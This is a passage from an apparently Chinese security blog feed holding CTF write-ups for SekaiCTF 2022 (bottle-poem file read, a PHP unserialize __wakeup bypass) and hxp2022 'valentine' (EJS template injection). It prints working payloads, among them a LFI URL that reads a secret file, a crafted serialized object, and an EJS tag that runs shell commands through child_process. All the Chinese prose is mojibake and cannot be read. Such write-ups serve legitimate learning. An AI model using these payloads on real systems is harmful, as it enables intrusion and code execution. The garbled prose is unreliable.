<p>æˆ‘ä»¬å¯ä»¥è®¿é—®çœ‹çœ‹ï¼Œèƒ½ä¸èƒ½çœ‹åˆ°é‡Œé¢çš„å†…å®¹ã€æ³¨æ„è¿™ä¸ªæ–‡ä»¶è‚¯å®šæ˜¯åœ¨ <code>/app</code>ç›®å½•ä¸‹ã€‘</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team<span class="regexp">/show?id=/</span>app<span class="regexp">/config/</span>secret.py</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sekai</span> <span class="operator">=</span> <span class="string">&quot;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&quot;</span></span><br></pre></td></tr></table></figure>



<hr>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> lfi è¯»å–æ–‡ä»¶å’Œç§˜å¯†</span><br><span class="line"><span class="bullet">2.</span> ä½¿ç”¨ cookie pickle rce åå¼¹shell</span><br><span class="line"><span class="bullet">3.</span> æ‰§è¡Œ./flagè·å–flag</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®å®˜æ–¹çš„<code>pickle rce</code>ï¼Œè¿™ä¸ªæ¶‰åŠæ–°çš„ <code>pickle</code> ååºåˆ—åŒ–æŠ€å·§</p>
<p>ã€æµä¸‹æ²¡æŠ€æœ¯çš„çœ¼æ³ªã€‘å¯æˆ‘ç°åœ¨åªä¼š<code>php</code>ååºåˆ—åŒ–ï¼Œåé¢è¡¥ä¸Š</p>
<hr>
<h2 id="2-sekai-game-start"><a href="#2-sekai-game-start" class="headerlink" title="2.sekai-game-start"></a>2.sekai-game-start</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./flag.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span> = True;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start === True)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sekai Game Start Here is your flag &quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=False;    </span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>çœ‹èµ·æ¥æ˜¯åˆ°<code>ååºåˆ—åŒ–</code>çš„é¢˜ç›®ï¼Œçœ‹èµ·æ¥ä¼¼ä¹éš¾åº¦ä¸å¤§ï¼Œä½†æ˜¯æˆ‘è¢«ç“¶å­è¯—å¡äº†å¤ªä¹…ï¼Œè¿™å‡ å¤©åˆåœ¨æ<code>DC5</code>ï¼Œåé¢çš„é¢˜ç›®å‘å¸ƒå‡ºæ¥éƒ½æ²¡æ€ä¹ˆçœ‹äº†ï¼Œæ—©çŸ¥é“åšä¸€ä¸‹äº†<code>ã€å“­å”§å”§ã€‘</code></p>
<p>æˆ‘ä»¬å…ˆç®€å•çš„åˆ†æä¸€ä¸‹æºç å†…å®¹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./flag.php&#x27;</span>);    <span class="comment">//æ–‡ä»¶åŒ…å«ï¼ŒæŠŠå½“å‰ç›®å½•flag.phpæ–‡ä»¶</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span> = True;<span class="comment">//ç»™stratå˜é‡èµ‹å€¼ä¸ºTrue</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start === True)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sekai Game Start Here is your flag &quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">            <span class="comment">//getenvå‡½æ•° ç”¨æ¥è·å–php ç¯å¢ƒå˜é‡</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=False;</span><br><span class="line"><span class="comment">//è¿™é‡ŒåˆæŠŠstartå˜é‡èµ‹å€¼ä¸ºFalseï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯éœ€è¦ç»•è¿‡__wakeupé­”æœ¯æ–¹æ³•ï¼Œä¸è®©å…¶æ‰§è¡Œï¼Œåªç”¨æŠŠå±æ€§ä¸ªæ•°æ”¹å¾—å¤§äºåŸæ¥å°±è¡Œ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]);  <span class="comment">//è¿™é‡Œå°±æ˜¯åºåˆ—åŒ–çš„å˜é‡ï¼Œå˜é‡åä¸ºsekai_game.run</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬æ•´ç†ä¸€ä¸‹</p>
<p>å¾—åˆ°æˆ‘ä»¬çš„åºåˆ—åŒ–çš„<code>php</code>ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span> = True;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Sekai_Game</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå¾—åˆ°åºåˆ—åŒ–ç»“æœ</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹å±æ€§å€¼</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><code>ã€è‹¦ç¬‘ã€‘ä½†å®é™…æ˜¯ä¸è¡Œçš„</code></p>
<h3 id="å…³é”®è€ƒç‚¹"><a href="#å…³é”®è€ƒç‚¹" class="headerlink" title="å…³é”®è€ƒç‚¹"></a>å…³é”®è€ƒç‚¹</h3><p>ä½†æ˜¯</p>
<p><img src="/post/2022SekaiCTF/image-20221003135130855.png" alt="image-20221003135130855"></p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">PhP å˜é‡ä¸èƒ½ä½¿ç”¨ . ï¼Œä½†æ˜¯è¿™ä¸ªå˜é‡åå¾ˆç‰¹æ®Šï¼šsekai_game.run. å®ƒåŒæ—¶å…·æœ‰ <span class="literal">_</span> å’Œ . </span><br><span class="line"></span><br><span class="line">phpé»˜è®¤å°†.æ‰€æœ‰å‚æ•°åç§°è½¬æ¢ä¸º<span class="literal">_</span>ï¼Œå› ä¸ºç‰ˆæœ¬æ—©äº<span class="number">8</span>ï¼Œæœ‰ä¸€ç§æ–¹æ³•å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½¿ç”¨[ ï¼Œphpå¿½ç•¥æ‰€æœ‰ . ï¼Œåªè½¬æ¢[ä¸º<span class="literal">_</span>å‚æ•° ==&gt; ?sekai[game.run=</span><br><span class="line"></span><br><span class="line">**å­¦åˆ°äº†**</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æœ‰æ•ˆçš„<code>payload</code>ä¸º</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">url/?sekai[game.<span class="attribute">run</span>=xxx</span><br></pre></td></tr></table></figure>



<p>ç¬¬äºŒæ­¥æ˜¯ç»•è¿‡<code>__wakeup</code></p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">è¿™é‡Œæˆ‘ç”¨</span><br><span class="line">O:10:&quot;Sekai_Game&quot;:2:&#123;s:5:&quot;start&quot;;b:1;&#125;</span><br><span class="line"></span><br><span class="line">å®é™…è¿˜æ˜¯ç»•ä¸è¿‡__wakeupå‡½æ•°ï¼Œå°±ç®—æ˜¯å±æ€§ä¸ªæ•°å¤§äºåŸæ¥çš„å±æ€§ä¸ªæ•°</span><br><span class="line"></span><br><span class="line"><span class="section">==&gt;ç½‘ä¸Šæ‰¾äº†ä»¥åï¼Œå‘ç°è¿™ä¸ªæ–¹æ³•æ˜¯æœ‰å±€é™æ€§çš„ï¼Œå¯¹äºé«˜ç‰ˆæœ¬çš„phpï¼Œè¿™æ ·æ˜¯æ— æ³•ç»•è¿‡__wakeup()</span></span><br><span class="line"><span class="section">----</span></span><br><span class="line"></span><br><span class="line">å¯¹äºé«˜ç‰ˆæœ¬çš„php</span><br><span class="line">å¯ä»¥ç”¨C:æ¥ç»•è¿‡</span><br><span class="line"></span><br><span class="line">åŸç†æ˜¯C:ä»£è¡¨è¿™ä¸ªç±»å®ç°äº†serializeableæ¥å£ï¼Œè€Œserializeableä¸æ”¯æŒ<span class="emphasis">__wakeupï¼Œå°±ç»•è¿‡å»äº†</span></span><br><span class="line"><span class="emphasis">==&gt;</span></span><br><span class="line"><span class="emphasis">C:10:&quot;Sekai_</span>Game&quot;:2:&#123;s:5:&quot;start&quot;;b:1;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ä½†æ˜¯å› ä¸ºæºç ä¸­å·²ç»èµ‹å€¼ï¼Œæ‰€ä»¥ä¸å¡«å†™æ•°æ®ï¼Œ</span><br><span class="line">åªç”¨å®ä¾‹åŒ–Sekai_Gameç±»</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Sekai_Game</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">==&gt;O:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br><span class="line">==&gt;C:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br></pre></td></tr></table></figure>



<p>äºæ˜¯æœ€åçš„payloadä¸º</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">?sekai[game.<span class="built_in">run</span>=C:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/post/2022SekaiCTF/image-20221003162948932.png" alt="image-20221003162948932"></p>
<p><strong>å¾—åˆ°flag</strong></p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>hxp2022 wp</title>
    <url>//post/2022hxp/</url>
    <content><![CDATA[<p><code>åœ¨ctftimeçœ‹åˆ°çš„ï¼Œé¢˜ç›®æœ‰æ·±åº¦çš„</code></p>
<span id="more"></span>

<blockquote>
<p>Disclaimer</p>
<p>This challenge offers an individual instance for you and therefore runs behind a proxy requesting login credentials. Locally use <code>hxp:hxp</code>.</p>
</blockquote>
<p>æ¯ä¸ªé¢˜çš„<code>docker-compose.yml</code>æ–‡ä»¶éœ€è¦ä¿®æ”¹ä¸€ä¸‹</p>
<figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line">   <span class="attribute">build</span><span class="punctuation">:</span></span><br><span class="line"><span class="attribute">+    context</span><span class="punctuation">:</span> <span class="string">.</span></span><br><span class="line">     <span class="attribute">dockerfile</span><span class="punctuation">:</span> <span class="string">Dockerfile</span></span><br></pre></td></tr></table></figure>

<h2 id="valentine"><a href="#valentine" class="headerlink" title="valentine"></a>valentine</h2><p>WEB</p>
<p>Difficulty estimate: - easy</p>
<blockquote>
<p>Description:</p>
<p>Create an awesome template for your valentine and share it with the world!</p>
</blockquote>
<p>å¼€å§‹é¡µé¢ä¸€çœ‹å°±çŸ¥é“æ˜¯node.jsçš„ssti</p>
<p><img src="/post/2022hxp/image-20230406222548469.png" alt="image-20230406222548469"></p>
<p><img src="/post/2022hxp/image-20230406222817323.png" alt="image-20230406222817323"></p>
<p>å°è¯•ç›´æ¥ç”¨payloadè§£å†³</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">&lt;%= <span class="built_in">global</span>.<span class="built_in">process</span>.mainModule.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;cat /flag.txt&#x27;</span>) %&gt;</span><br></pre></td></tr></table></figure>

<p>å‘ç°è¾“å…¥çš„æ•°æ®å®é™…ä¸Šå°±æ˜¯å®ç°ä¸€ä¸ªå‰ç«¯çš„æ•ˆæœï¼Œå¹¶ä¸è¢«æ¨¡æ¿åŒ–<img src="/post/2022hxp/image-20230406223708029.png" alt="image-20230406223708029"></p>
<p>çœ‹çœ‹app.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line">viewsFolder = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(viewsFolder)) &#123;</span><br><span class="line">  fs.<span class="title function_">mkdirSync</span>(viewsFolder);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, viewsFolder);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/template&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> tmpl = req.<span class="property">body</span>.<span class="property">tmpl</span>;</span><br><span class="line">  <span class="keyword">let</span> i = -<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>((i = tmpl.<span class="title function_">indexOf</span>(<span class="string">&quot;&lt;%&quot;</span>, i+<span class="number">1</span>)) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (tmpl.<span class="title function_">substring</span>(i, i+<span class="number">11</span>) !== <span class="string">&quot;&lt;%= name %&gt;&quot;</span>) &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123;<span class="attr">message</span>:<span class="string">&quot;Only &#x27;&lt;%= name %&gt;&#x27; is allowed.&quot;</span>&#125;);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> uuid;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    uuid = crypto.<span class="title function_">randomUUID</span>();</span><br><span class="line">  &#125; <span class="keyword">while</span> (fs.<span class="title function_">existsSync</span>(<span class="string">`views/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    fs.<span class="title function_">writeFileSync</span>(<span class="string">`views/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>, tmpl);</span><br><span class="line">  &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Failed to write Valentine&#x27;s card&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> name = req.<span class="property">body</span>.<span class="property">name</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/<span class="subst">$&#123;uuid&#125;</span>?name=<span class="subst">$&#123;name&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/:template&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> query = req.<span class="property">query</span>;</span><br><span class="line">  <span class="keyword">let</span> template = req.<span class="property">params</span>.<span class="property">template</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$/i</span>.<span class="title function_">test</span>(template)) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&quot;Not a valid card id&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(<span class="string">`views/<span class="subst">$&#123;template&#125;</span>.ejs`</span>)) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Valentine\&#x27;s card does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!query[<span class="string">&#x27;name&#x27;</span>]) &#123;</span><br><span class="line">    query[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">render</span>(template, query);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">sendFile</span>(<span class="string">&#x27;./index.html&#x27;</span>, &#123;<span class="attr">root</span>: __dirname&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">3000</span>);</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/template&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> tmpl = req.<span class="property">body</span>.<span class="property">tmpl</span>;</span><br><span class="line">  <span class="keyword">let</span> i = -<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>((i = tmpl.<span class="title function_">indexOf</span>(<span class="string">&quot;&lt;%&quot;</span>, i+<span class="number">1</span>)) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (tmpl.<span class="title function_">substring</span>(i, i+<span class="number">11</span>) !== <span class="string">&quot;&lt;%= name %&gt;&quot;</span>) &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123;<span class="attr">message</span>:<span class="string">&quot;Only &#x27;&lt;%= name %&gt;&#x27; is allowed.&quot;</span>&#125;);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> uuid;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    uuid = crypto.<span class="title function_">randomUUID</span>();</span><br><span class="line">  &#125; <span class="keyword">while</span> (fs.<span class="title function_">existsSync</span>(<span class="string">`views/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    fs.<span class="title function_">writeFileSync</span>(<span class="string">`views/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>, tmpl);</span><br><span class="line">  &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Failed to write Valentine&#x27;s card&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> name = req.<span class="property">body</span>.<span class="property">name</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/<span class="subst">$&#123;uuid&#125;</span>?name=<span class="subst">$&#123;name&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>å‘ç°å®ƒä¼šå°†è¾“å…¥çš„tmplå†™å…¥<code>views/$&#123;uuid&#125;.ejs</code>å½“ä½œæ¨¡æ¿</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  fs.<span class="title function_">writeFileSync</span>(<span class="string">`views/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>, tmpl);</span><br><span class="line">&#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Failed to write Valentine&#x27;s card&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å­˜åœ¨æ ¡éªŒ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>((i = tmpl.<span class="title function_">indexOf</span>(<span class="string">&quot;&lt;%&quot;</span>, i+<span class="number">1</span>)) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (tmpl.<span class="title function_">substring</span>(i, i+<span class="number">11</span>) !== <span class="string">&quot;&lt;%= name %&gt;&quot;</span>) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123;<span class="attr">message</span>:<span class="string">&quot;Only &#x27;&lt;%= name %&gt;&#x27; is allowed.&quot;</span>&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ®µè¯­å¥é™åˆ¶äº†å¦‚æœè¾“å…¥çš„å­—æ®µå¼€å¤´ä¸º<code>&lt;%</code>ï¼Œé‚£ä¹ˆä»<code>&lt;%</code>å¼€å¤´åçš„å­—æ®µå¿…é¡»æ˜¯<code>&lt;%= name %&gt;</code></p>
<p>å¼€å§‹å°è¯•å„ç§æ–¹æ³•ç»•è¿‡ï¼Œä½†ç¡®å®ä¸è¡Œï¼Œå› ä¸ºä»…èƒ½æ˜¯<code>&lt;%= name %&gt;</code>,é‡Œé¢ä¹Ÿä¸èƒ½åŠ ä¸œè¥¿</p>
<blockquote>
<p>åé¢åªæœ‰çœ‹wpæ‰æœ‰æ€è·¯ï¼Œæ—¢ç„¶æ˜¯ä»&lt;%è¿›è¡ŒåŒ¹é…é™åˆ¶ï¼Œå¦‚æœå¯ä»¥ä¿®æ”¹æ¨¡æ¿è¯­å¥è®©å…¶ä¸æ˜¯&lt;%çš„å¼€å¤´ï¼Œ</p>
<p>æ‰€ä»¥ç»•è¿‡çš„æ€è·¯å°±æ˜¯èƒ½ç”¨å…¶ä»–çš„æ ‡ç­¾è¿›è¡Œç»•è¿‡</p>
</blockquote>
<p>ä½†æ˜¯åœ¨æ–‡æ¡£ä¸­æŸ¥çœ‹æ—¶ä¼šå‘ç°ï¼Œæ‰€æœ‰éƒ½æ˜¯ä»¥<code>&lt;%</code>å¼€å¤´çš„æ ‡ç­¾</p>
<p><img src="/post/2022hxp/image-20230411181542931.png" alt="image-20230411181542931"></p>
<h3 id="delimiter"><a href="#delimiter" class="headerlink" title="delimiter"></a>delimiter</h3><p><a href="https://github.com/mde/ejs#custom-delimiters">mde&#x2F;ejs: Embedded JavaScript templates delimiter</a></p>
<p>å¯ä»¥çœ‹åˆ°æ ‡ç­¾å‡ ä¹éƒ½æ˜¯ä»¥<code>&lt;%</code>å¼€å¤´å’Œç»“å°¾çš„ï¼Œ</p>
<p>åé¢çœ‹å®˜æ–¹wpæ—¶</p>
<blockquote>
<p>In his analysis, Eslam even scratches the possibility to overwrite options which are passed with data. He specifically mentions the delimiter in the context of abusing it for catastrophic regex.</p>
<p><strong>In what scenario does anybody even want to pass options with untrusted user data?</strong></p>
<p>Especially: Options which greatly affect the parsing of the template like ?<code>delimiter</code></p>
<p>And: Could this â€œfeatureâ€ maybe be abused in any way?</p>
<p>Thus, the idea for this challenge was born.</p>
</blockquote>
<p>å¤§è‡´æ„æ€å°±æ˜¯å› ä¸ºå¤§éƒ½sstiè¿‡æ»¤å°±åªæ˜¯å¯¹åˆ†éš”ç¬¦è¿›è¡Œæ­£åˆ™åŒ¹é…è¿‡æ»¤ï¼Œä½†æ˜¯å¦‚æœæœ‰é€‰é¡¹æ¯”å¦‚<code>delimiter</code>ï¼Œå¯ä»¥åˆ©ç”¨å…¶ä»¥ä¸å—ä¿¡ä»»çš„ç”¨æˆ·èº«ä»½å‘ç”Ÿæ•°æ®æˆ–è€…ä»¥å…¶ä»–å½¢å¼æ»¥ç”¨</p>
<p><code>delimiter</code>å°±æ˜¯å¯¹æ ‡ç­¾çš„åˆ†éš”ç¬¦å®šä¹‰çš„é€‰é¡¹ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å…¶ä¿®æ”¹è¦†ç›–æ ‡ç­¾ï¼Œä»<code>&lt;%=</code>å˜æˆ<code>&lt;?=</code>æˆ–è€…<code>&lt;==</code>ç­‰ç­‰</p>
<p><img src="/post/2022hxp/image-20230411185506095.png" alt="image-20230411185506095"></p>
